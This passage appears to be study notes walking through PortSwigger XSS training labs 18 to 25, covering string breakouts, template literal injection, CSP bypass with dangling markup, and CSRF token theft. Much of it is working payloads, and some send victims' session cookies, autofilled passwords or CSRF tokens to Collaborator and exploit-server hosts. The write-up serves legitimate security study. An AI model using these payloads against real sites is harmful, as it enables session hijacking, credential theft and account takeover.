> To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

### Solution

- Inject a test string into the search field and inspect the source:

![[images/walkthrough/PortSwigger/XSS/lab18/1.png]]

- See that the search term is reflected in the tracking JavaScript.
- The single quote is, however, backslash-escaped:

![[images/walkthrough/PortSwigger/XSS/lab18/2.png]]

- Angle brackets, however, are not encoded or escaped at all, So you can break from the JavaScript tag into HTML context:

```html
test123</script>
```

![[images/walkthrough/PortSwigger/XSS/lab18/3.png]]

- How you can just enter the `<script>` tag again:

```html
test123</script><script>alert(document.domain)</script>
```

![[images/walkthrough/PortSwigger/XSS/lab18/4.png]]


![[images/walkthrough/PortSwigger/XSS/lab18/solved.png]]

Solved!
## 19. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

>[!done]

>[!note]+ Lab description
> - [`Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped`](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)
> 
> - Level: #Practitioner 
> 
> This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
> 
> To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

### Solution

- The search query is injected into page's JavaScript:

![[images/walkthrough/PortSwigger/XSS/lab19/1.png]]

- However, this time, angle brackets and double quotes are HTML-encoded and single quotes are backslash-escaped:

![[images/walkthrough/PortSwigger/XSS/lab19/2.png]]

- Try inserting backslashes to escape backslashes the application inserts to escape your quote:
	- `test123';` -> `test123\';'`
	- `test123\';` -> `test123\\';'`;

![[images/walkthrough/PortSwigger/XSS/lab19/3.png]]

```js
test123\';alert(document.domain)
		-> test123\\';alert(document.domain)';
```

![[images/walkthrough/PortSwigger/XSS/lab19/4.png]]

- Add a comment to deal with the remaining quote:

```js
test123\';alert(document.domain)//
```

![[images/walkthrough/PortSwigger/XSS/lab19/5.png]]

![[images/walkthrough/PortSwigger/XSS/lab19/solved.png]]


Solved!
## 20. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

>[!done]

>[!note]+ Lab description
> - [`Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped`](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
> - Level: #Practitioner 
> 
> This lab contains a stored cross-site scripting vulnerability in the comment functionality.
> 
> To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

### Solution

- Post a test comment and inspect the page. 
- There is a comment tracking JavaScript:

![[images/walkthrough/PortSwigger/XSS/lab20/1.png]]

- However, single quotes are backslash-escaped, angle brackets and double quotes are HTML-encoded:

![[images/walkthrough/PortSwigger/XSS/lab20/2.png]]

- Attempt to escape the JavaScript string using the following payload:

```js
&apos;-alert(document.domain)-&apos;
```

- The comment appears without a website link, which means it is actually validated on the backend and sanitized.
- Attempt to bypass this with:

```js
http://example?'-alert(document.domain)-'
```


![[images/walkthrough/PortSwigger/XSS/lab20/3.png]]

- The comment is posted:

![[images/walkthrough/PortSwigger/XSS/lab20/4.png]]

- Clicking the link triggers an alert:

![[images/walkthrough/PortSwigger/XSS/lab20/5.png]]

![[images/walkthrough/PortSwigger/XSS/lab20/solved.png]]

Solved!

## 21. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

>[!done]

>[!note]+ Lab description
> - [`Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped`](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)
> - Level: #Practitioner 
> 
> This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the `alert` function inside the template string.

### Solution

- Inject an arbitrary string and see how it is reflected in application response:

```html
test123
```

- Observe your input is injected into a JavaScript template string:

![[images/walkthrough/PortSwigger/XSS/lab21/1.png]]

- In this case, you can inject JavaScript code using this syntax:


```JS
${alert(document.domain)}
```

![[images/walkthrough/PortSwigger/XSS/lab21/2.png]]

![[images/walkthrough/PortSwigger/XSS/lab21/solved.png]]
## 22. Exploiting cross-site scripting to steal cookies 

>[!warning] #Collaborator Burp Collaborator (Professional Edition) is required to solve this lab.

>[!done]

>[!note]+ Lab description
> - [`Lab: Exploiting cross-site scripting to steal cookies`](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
> - Level: #Practitioner 
> 
> 
> This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

### Solution

- Find comment functionality and send a test comment. 
- See the application doesn't have any restrictions on markup you can insert. Everything is evaluated:

![[images/walkthrough/PortSwigger/XSS/lab22/1.png]]


- See you can execute JavaScript using:

```html
<img src=x onerror=alert()>
```

or 

```html
<script>alert(1)</script>
```

![[images/walkthrough/PortSwigger/XSS/lab22/2.png]]


- Insert a payload with your Collaborator domain:

```html
<script>
fetch('https://hg1xdwi2giy6hlmgl6qk04n2wt2kqbe0.oastify.com', {method: 'POST', mode: 'no-cors', body:document.cookie});
</script>
```

- Go to `Collaborator` -> `Poll now`. See interactions. In one of the HTTP requests, find cookies:

![[images/walkthrough/PortSwigger/XSS/lab22/3.png]]

- Then send `GET` to `/` to `Repeater`, change path to `/my-account`, and replace your cookies with the stolen ones. Send the request.

- Notice you are able to access `administrator` account:

![[images/walkthrough/PortSwigger/XSS/lab22/4.png]]

![[images/walkthrough/PortSwigger/XSS/lab22/solved.png]]

Solved!
## 23. Exploiting cross-site scripting to capture passwords

>[!warning] #Collaborator Burp Collaborator (Professional Edition) is required to solve this lab.

>[!note]+ Lab description
> - [`Lab: Exploiting cross-site scripting to capture passwords`](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
> - Level: #Practitioner 
> 
> This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

### Solution
- Observe the comment functionality is vulnerable to stored XSS:

![[images/walkthrough/PortSwigger/XSS/lab23/1.png]]

#### Solution using Collaborator

- Paste the following as a comment:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

- This is HTML that creates two form input fields for username and password.
- The code exploits browsers' password auto-fill behavior. 
	- When a victim views the comment, their browser automatically inserts their username and password stored for the given domain into the fields of the appropriate type.
	- As soon as this happens, the contents of the `password` input changes (from empty to the stored password), and the `onchange` event handler fires.
	- The handler JavaScript first checks if the password field is empty (to avoid sending empty passwords), and if no, sends its value to your `Collaborator` domain in HTTP body. 

![[images/walkthrough/PortSwigger/XSS/lab23/2.png]]

- Go to `Collaborator` and see interactions (if not, click `Poll now`). Administrator's username and passwords should be in an HTTP request body:

![[images/walkthrough/PortSwigger/XSS/lab23/3.png]]

- Use these credentials to log in as `administrator`.

![[images/walkthrough/PortSwigger/XSS/lab23/solved.png]]

Solved!


#### Solution without Collaborator
## 24. Exploiting XSS to bypass CSRF defenses

>[!note]+ Lab description
> - [`Lab: Exploiting XSS to bypass CSRF defenses`](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
> - Level: #Practitioner 
> 
> This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.
> 
> You can log in to your own account using the following credentials: `wiener:peter`
> 

### Solution

- Navigate any post and leave a comment. See that markdown is treated as-is, with no encoding:

![[images/walkthrough/PortSwigger/XSS/lab24/1.png]]

- Test for code execution:

```html
<script>alert(1)</script>
```

- Leave the comment and navigate back to the blog post page. See an alert:

![[images/walkthrough/PortSwigger/XSS/lab24/2.png]]

![[images/walkthrough/PortSwigger/XSS/lab24/3.png]]

- Log in as `wiener` and change your email address. See that the application uses CSRF tokens.

![[images/walkthrough/PortSwigger/XSS/lab24/4.png]]

- However, since you've found an XSS vulnerability in the same application, you can bypass CSRF token protection. 
- Construct an exploit:

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account', true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@example.com');
};
</script>
```

- Post this as a comment.

![[images/walkthrough/PortSwigger/XSS/lab24/solved.png]]

Solved!
## 25. Reflected XSS protected by very strict CSP, with dangling markup attack

>[!note]+ Lab description
> 
> - [`Lab: Reflected XSS protected by very strict CSP, with dangling markup attack`](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
> - Level: #Practitioner 
> 
> This lab uses a strict CSP that prevents the browser from loading subresources from external domains.
> 
> To solve the lab, perform a form hijacking attack that bypasses the CSP, exfiltrates the simulated victim user's CSRF token, and uses it to authorize changing the email to `hacker@evil-user.net`.
> 
> You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:
> 
> `<a href="">Click me</a>`
> 
> You can log in to your own account using the following credentials: `wiener:peter`
> 

### Solution

- Log in as `wiener` and change your email address. Inspect the request and response:

![[images/walkthrough/PortSwigger/XSS/lab25/1.png]]


- Now notice that you can pre-fill email address in the form using a URL query parameter:

![[images/walkthrough/PortSwigger/XSS/lab25/2.png]]

- Inspect the element and analyze the injection source:

![[images/walkthrough/PortSwigger/XSS/lab25/3.png]]

- Notice the injection context is in the input element right before the CSRF token you're targeting. 
- Observe that you do can inject JavaScript using the `email` parameter like `<img src=x onerror=alert()>`:

![[images/walkthrough/PortSwigger/XSS/lab25/4.png]]


- However, the code does not execute. If you take a closer look at application responses, you notice the [[CSP]] (Content-Security-Policy) it uses: 

```js
Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
```

- Go to DevTools -> `Console`, and see CSP errors:

![[images/walkthrough/PortSwigger/XSS/lab25/5.png]]

 This confirms why the code hasn't execute — because CSP prevents this.


```js
my-account?id=wiener&email=test%22%3E%3Cimg%20src=x%20onerror=alert()%3E:58 Executing inline event handler violates the following Content Security Policy directive 'script-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present. The action has been blocked.
```


- The error means you injected a payload that successfully created an HTML element (`<img>`), but the browser's CSP prevented the JavaScript from executing. 
- So, in `<img src="x" onerror="alert()">`, since `x` is not a valid image source, the image fails to load, which triggers the `onerror` event and attempts to execute `alert()`. 
- However, in application CSP, there's `Content-Security-Policy: ... script-src 'self'; ...`, which says the browser that **only JavaScript loaded from the site's own origin may execute**. Inline JavaScript is blocked, including things like `<script>alert(1)</script>`, `<button onclick="alert(1)">`, and `<img src="x" onerror="alert()">`.

---

- A similar thing would happen if you tried to load an image from an external domain, such as from your exploit server:

```html
test"><img src=https://exploit-0ac0009e0372aee98024021101de002d.exploit-server.net/exploit onerror=alert()>
```

![[images/walkthrough/PortSwigger/XSS/lab25/6.png]]

```js
Loading the image 'https://exploit-0ac0009e0372aee98024021101de002d.exploit-server.net/exploit' violates the following Content Security Policy directive: "img-src 'self'". The action has been blocked.
```

- The image is not loaded because the CSP blocks loading images from external sources.

---

- If you can't embed a resource from an external source, try creating a link:

```html
"><a href="https://exploit-0ac0009e0372aee98024021101de002d.exploit-server.net/exploit">Click me</a
```

![[images/walkthrough/PortSwigger/XSS/lab25/7.png]]

- Instead of injecting an image, you inject a link. If you click that link, you'll be redirected to `/exploit` from your exploit server.

---
>[!note] In the past, it was possible to solve the lab by injecting a `<base>` element with the `target` attribute. However, after a Chrome patch, it is no longer possible. I've found the following solution [here](https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/).

- It is also possible to inject a `<form>` element like this:

```html
"></form><form class="login-form" name="evil-form" action="https://exploit-0a5f00d6037fe00a81c4101901aa00be.exploit-server.net/log" method="GET"><button class="button" type="submit"> Click me </button>
```

- URL-encoded:

```
%22%3E%3C/form%3E%3Cform%20class=%22login%2Dform%22%20name=%22evil%2Dform%22%20action=%22https://exploit%2D0a5f00d6037fe00a81c4101901aa00be%2Eexploit%2Dserver%2Enet/log%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E
```

![[images/walkthrough/PortSwigger/XSS/lab25/9.png]]


- Click the link and see the CSRF token was brought to the logs with the URL:

![[images/walkthrough/PortSwigger/XSS/lab25/10.png]]

- Copy the link and create an exploit:

```html
<script>
window.location="https://0a4500f00342e03481401198000000cb.web-security-academy.net/my-account?id=wiener&email=test%22%3E%3C/form%3E%3Cform%20class=%22login%2Dform%22%20name=%22evil%2Dform%22%20action=%22https://exploit%2D0a5f00d6037fe00a81c4101901aa00be%2Eexploit%2Dserver%2Enet/log%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E"
</script>
```

![[images/walkthrough/PortSwigger/XSS/lab25/11.png]]

- `Store` and `Deliver exploit to victim`.; go to `Access log` and copy the CSRF token you captured.

- Then create a CSRF PoC for `/my-account/change-email`:

```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a4500f00342e03481401198000000cb.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="CAPTURED_CSRF_HERE" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```


```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a4500f00342e03481401198000000cb.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="CAPTURED_CSRF_HERE" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```


```html
<body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://0a4500f00342e03481401198000000cb.web-security-academy.net/";
const exploitServer = "https://exploit-0a5f00d6037fe00a81c4101901aa00be.exploit-server.net/";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```